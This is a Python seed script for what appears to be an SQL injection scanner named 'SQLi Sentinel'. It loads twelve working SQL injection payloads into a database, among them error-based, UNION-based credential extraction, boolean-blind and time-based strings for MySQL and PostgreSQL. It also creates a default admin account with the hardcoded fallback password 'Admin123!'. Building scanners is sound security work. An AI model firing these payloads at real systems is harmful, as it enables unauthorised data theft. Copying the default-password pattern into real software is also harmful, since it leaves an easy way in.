from __future__ import annotations

import os
import uuid

from backend_v2.app.core.database import managed_connection
from backend_v2.app.core.security import generate_token, hash_password, utc_now_iso


DEFAULT_USER_EMAIL = os.environ.get('SQLI_SENTINEL_DEFAULT_ADMIN_EMAIL', 'admin@sqli-sentinel.local')
DEFAULT_USER_PASSWORD = os.environ.get('SQLI_SENTINEL_DEFAULT_ADMIN_PASSWORD', 'Admin123!')
SEED_ENABLE_DEFAULT_ADMIN = os.environ.get('SQLI_SENTINEL_SEED_DEFAULT_ADMIN', 'true').strip().lower() in {'1', 'true', 'yes'}

SEED_PAYLOADS = [
    ('Error-based', "' AND extractvalue(1,concat(0x7e,(select @@version)))-- ", 78, 'MySQL extractvalue error injection', 'MySQL', 1),
    ('Error-based', "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- ", 75, 'MySQL updatexml error injection', 'MySQL', 1),
    ('Error-based', "'; SELECT CAST(CAST((SELECT version()) AS NUMERIC) AS TEXT)-- ", 72, 'PostgreSQL CAST error injection', 'PostgreSQL', 1),
    ('Union-based', "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", 85, '5-column UNION injection', 'Generic', 1),
    ('Union-based', "' UNION SELECT table_name,column_name,3,4,5 FROM information_schema.columns-- ", 82, 'UNION information extraction', 'MySQL', 1),
    ('Union-based', "1' UNION SELECT username,password,3,4,5 FROM users-- ", 88, 'User data extraction via UNION', 'MySQL', 0),
    ('Boolean-based', "' AND '1'='1", 92, 'Simple boolean true condition', 'Generic', 1),
    ('Boolean-based', "' AND 1=1-- ", 90, 'Comment-based boolean injection', 'Generic', 1),
    ('Boolean-based', "' AND (SELECT COUNT(*) FROM users) > 0-- ", 87, 'Subquery-based boolean blind', 'Generic', 1),
    ('Time-based', "' AND SLEEP(5)-- ", 79, 'MySQL SLEEP time-based blind', 'MySQL', 1),
    ('Time-based', "' AND BENCHMARK(5000000,SHA1('blind'))-- ", 76, 'MySQL BENCHMARK time-based blind', 'MySQL', 1),
    ('Time-based', "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END-- ", 81, 'PostgreSQL pg_sleep time-based', 'PostgreSQL', 1),
]


def seed_database() -> None:
    with managed_connection() as connection:
        payload_count = connection.execute("SELECT COUNT(*) AS count FROM payloads").fetchone()['count']
        if payload_count == 0:
            for payload_type, payload, success_rate, description, category, enabled in SEED_PAYLOADS:
                connection.execute(
                    """
                    INSERT INTO payloads (id, type, payload, success_rate, description, category, enabled, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (f"payload-{uuid.uuid4().hex[:8]}", payload_type, payload, success_rate, description, category, enabled, utc_now_iso()),
                )

        user_count = connection.execute("SELECT COUNT(*) AS count FROM users").fetchone()['count']
        if user_count == 0 and SEED_ENABLE_DEFAULT_ADMIN:
            user_id = f"user-{uuid.uuid4().hex[:8]}"
            connection.execute(
                """
                INSERT INTO users (id, email, name, password_hash, role, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (user_id, DEFAULT_USER_EMAIL, 'Platform Admin', hash_password(DEFAULT_USER_PASSWORD), 'admin', utc_now_iso()),
            )
            connection.execute(
                """
                INSERT INTO api_keys (id, user_id, name, token, active, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (
                    f"key-{uuid.uuid4().hex[:8]}",
                    user_id,
                    'Default Gemini Key Placeholder',
                    generate_token(),
                    1,
                    utc_now_iso(),
                ),
            )

        activity_count = connection.execute("SELECT COUNT(*) AS count FROM activities").fetchone()['count']
        if activity_count == 0:
            for activity_type, description, status in [
                ('scan_completed', "Demo scan https://example.com/login uchun yakunlandi", 'success'),
                ('vulnerability_detected', "query parametrida kritik finding demo sifatida yaratildi", 'critical'),
                ('report_generated', "Boshlang'ich hisobotlar tayyor holatda saqlandi", 'success'),
            ]:
                connection.execute(
                    """
                    INSERT INTO activities (id, type, description, status, created_at)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (f"activity-{uuid.uuid4().hex[:8]}", activity_type, description, status, utc_now_iso()),
                )
